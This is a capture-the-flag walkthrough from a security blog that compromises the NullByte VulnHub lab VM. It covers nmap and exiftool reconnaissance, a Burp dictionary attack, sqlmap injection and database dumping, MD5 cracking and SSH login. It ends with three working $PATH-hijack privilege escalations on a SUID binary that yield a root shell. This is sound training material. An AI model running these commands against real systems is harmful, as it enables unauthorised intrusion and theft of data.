<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the NullByte VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-nullbyte-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-09-27T14:51:22+00:00">September 27, 2016</time><time class="updated" datetime="2025-06-10T20:30:33+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This is our article on root2boot penetration testing challenge. We will walk through an exploitable framework of NullByte VM. Breaking into it isn’t too difficult. There isn’t any advanced exploitation or reverse engineering. The level is considered beginner-intermediate. We have to find “Proof.txt” and follow further steps. You can download it from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/nullbyte-1,126/">here</a></span>.</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
<ul>
<li><span style="color: #000000;">Network Scanning (Nmap, netdiscover)</span></li>
<li><span style="color: #000000;">Exacting hidden text from an image(ExifTool)</span></li>
<li><span style="color: #000000;">Dictionary Attack using rockyou.txt(Burp suite)</span></li>
<li><span style="color: #000000;">Steal Database information via SQL injection (Sqlmap)</span></li>
<li><span style="color: #000000;">Login to SSH</span></li>
<li><span style="color: #000000;">Find SUID Binaries</span></li>
<li><span style="color: #000000;">Privilege Escalation by Manipulating $PATH</span></li>
<li><span style="color: #000000;">Get Root access and capture the flag.</span></li>
</ul>
<p><span style="color: #000000;"><strong>Let’s Begin the Game!!!</strong></span></p>
<p><span style="color: #000000;"><strong> </strong>Start off by finding your target by running <strong>netdiscover</strong> on the terminal of the attacking machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Rnq170J1p2o/Ww5JztEbvAI/AAAAAAAAXEg/j_cNHhj72k8RHMyi8NRAtwrM1BduaXoRQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Our target is 192.168.1.142. And now that we know our target, we will scan it using nmap.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.142</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-mXqY7hqIHH4/Ww5J1Ik8tMI/AAAAAAAAXE4/l92OGtOQOrMcSVyDvoOFoxU15iQmiofVQCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Scanning the IP, we will know that the port number 80, 111, 777, 44607 are open. Please observe here that the service of <strong>SSH</strong> is forwarded <strong>from 22 to 777 port</strong>. This port may come in handy in the future to gain access.</span></p>
<p><span style="color: #000000;">Now we will try and open the targeted IP in the browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-A78zT-nSATI/Ww5J1JlX7xI/AAAAAAAAXE8/cITXouIDYlMaRzyLolpQMKRyA1mZTXenwCLcBGAs/s1600/3.png"/></span></p>
<p> </p>
<p><span style="color: #000000;">There are an image and a quote on the page. You will find nothing on the page source or otherwise. But there might be something hidden in the image and so, we will read the image using EXIF tool, therefore, download this image.</span></p>
<pre class="lang:default decode:true">exiftool main.gif</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1Ol5U0owMD0/Ww5J1ffnqtI/AAAAAAAAXFE/QmBxVVziIlw0zimD-VMXZKtq3xv2lqPggCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">There you will find a comment <strong>kzMb5nVYJw. </strong>Now this might be a directory and there is no harm in opening it the browser so let’s do that</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-lMFL3_etpck/Ww5J1QMPudI/AAAAAAAAXFA/XpgsiZXFGiQ1N96x3HsRx076L4cPzwrvwCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Our assumption was right as it opened in the browser. But it is asking for a key. And we have no idea what the key is so, therefore, we will use the dictionary attack to find the key using <strong>BurpSuite </strong>and <strong>rockyou.txt</strong>. Through the dictionary attack, you will find the key i.e.<strong> elite.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-gW6VH4FXfqE/Ww5J1rgqqZI/AAAAAAAAXFI/ZwbuAKYJc1wlAOEYRKbn3FB38LScOjPpwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Through the dictionary attack, you will find the key i.e.<strong> elite. </strong>Enter the key where it was asking and the new web page will get opened which will be asking for username, BUT this time also we do not know the username. So, we will find it in its Database using <strong>sqlmap. </strong>And for this type:</span></p>
<pre class="lang:default decode:true">sqlmap -u http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=1 --dbs --batch</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-q3MvCAE1MLs/Ww5J2AM1CpI/AAAAAAAAXFM/bznXaCRE0ToWfrtpIkQWoq2RKWM7v5GpgCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">It will give you the name of the database i.e. <strong>seth.  </strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-7GJXi_x1CLg/Ww5J2MGUIiI/AAAAAAAAXFQ/2r3q5Y_v2YYRQotSsMKdrto5rwYaHt7owCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Now further we will find columns and tables and for that type:</span></p>
<pre class="lang:default decode:true">sqlmap -u http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=1 -D seth --dump-all --batch</pre>
<p><span style="color: #000000;">Once command executes, it will show you the table name along with column and password as shown:</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-1IjtsZSoigs/Ww5J2aFej5I/AAAAAAAAXFU/QKG2cWK8i6wjQBiPNIiwXlifeP6y0oJxgCLcBGAs/s1600/9.png"/></strong></span></p>
<p><span style="color: #000000;">As a result, we have username and password but the password is in MD5 so we need to crack it and there are many online tools to do so. Therefore to crack it go to <strong>md5coder.org </strong>and give the md5 value there and click on ok and it will show you the original word i.e. <strong>omega</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-2wuarXs05ng/Ww5JzfKJWQI/AAAAAAAAXEc/q3PkarZS8dUtbgPcXr9XtRSk3rxOSMeGQCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now we will SSH to log in and for that type:</span></p>
<pre class="lang:default decode:true">ssh ramses@192.168.1.142 -p 777</pre>
<p><span style="color: #000000;">And then give <strong>omega</strong> as the password. And you are logged in. As you are now logged in type the following command to see the list of directories:</span></p>
<p><span style="color: #000000;">Then by using the following command, you can enumerate all binaries having SUID permission.</span></p>
<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;">We found that SUID bit enabled for /var/www/backup/procwatch which was quite attention-grabbing. So we decide to explore it for further steps.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-C06KwxlxWbg/Ww5JzdyIZZI/AAAAAAAAXEk/YfVaWauhW4wc8TVYwOLArqliyzmCL83XACLcBGAs/s1600/11.png"/></span></p>
<pre class="lang:default decode:true">cd /var/www/bakcup/
./procwatch</pre>
<p><span style="color: #000000;">So when I run the above command, it looks like the procwatch file is trying to run ps and this is a genuine file inside /bin for Process status. The most important things which could be considered here that the author has set SUID bit ON for procwatch and might be it could be any small program file which is calling system function such as ps.</span></p>
<p><span style="color: #000000;">Taking its advantage, we can escalate the root privilege and hit the goal of this VM. To achieve this we will have to manipulate the environment PATH variable. If we can get procwatch to run sh instead of ps, it should give us a root shell. Following techniques is called Linux Privilege escalation using environment $PATH variable and their so many methods to manipulate environment variable.</span></p>
<h3><span style="color: #800000;"><strong>1<sup>st</sup> Method</strong></span></h3>
<pre class="lang:default decode:true ">echo "/bin/sh"  &gt; ps
chmod 777 ps
echo $PATH
export PATH=.:$PATH
echo $PATH
./procwatch</pre>
<p><span style="color: #000000;">Due to ‘.’ in $PATH means that the user is able to execute binaries/scripts from the current directory. With us execution of above commands we will enter root and then further type ;</span></p>
<pre class="lang:default decode:true">id
cd /root
ls
cat proof.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-osNPHBVG0oM/Ww5Jz3sYjbI/AAAAAAAAXEo/1qktL_m-v7kf_ay3ht4ntwmG5dyi3nD6QCLcBGAs/s1600/12.png"/></span></p>
<h3><span style="color: #800000;"><strong>2<sup>nd</sup> Method </strong></span></h3>
<pre class="lang:default decode:true">cp /bin/sh /tmp/ps
echo $PATH
export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
./procwatch</pre>
<p><span style="color: #000000;">With us execution of above commands we will enter root and then further type ;</span></p>
<pre class="lang:default decode:true">id
cd /root
ls
cat proof.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WUezJFV4Y88/Ww5J0YKc35I/AAAAAAAAXEw/BLtrGPCHBVcREy-yl6k6bFkb10Cc1kklwCLcBGAs/s1600/13.png"/></span></p>
<h3><span style="color: #800000;"><strong>3<sup>rd</sup> Method</strong></span></h3>
<p><span style="color: #000000;"><strong>vi ps</strong></span></p>
<p><span style="color: #000000;">Once vi editors get open type /bin/sh and save the file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Ch3NyLpTxS8/Ww5J0QuSdUI/AAAAAAAAXEs/_t5jW0kka8Aui5aP28g1TfWWf9V0MDYcACLcBGAs/s1600/14.png"/></span></p>
<pre class="lang:default decode:true">chmod 777 ps
echo $PATH
export PATH=.:$PATH
cd /var/www/backup
./procwatch</pre>
<p><span style="color: #000000;">With us execution of above commands we will enter root and then further type ;</span></p>
<pre class="lang:default decode:true ">id
cd /root
ls
cat proof.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-IeAseBtnBUM/Ww5J0tUPFZI/AAAAAAAAXE0/nkf1NFQYdP8mlZQc2GWF3FaWBlm0vxRogCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
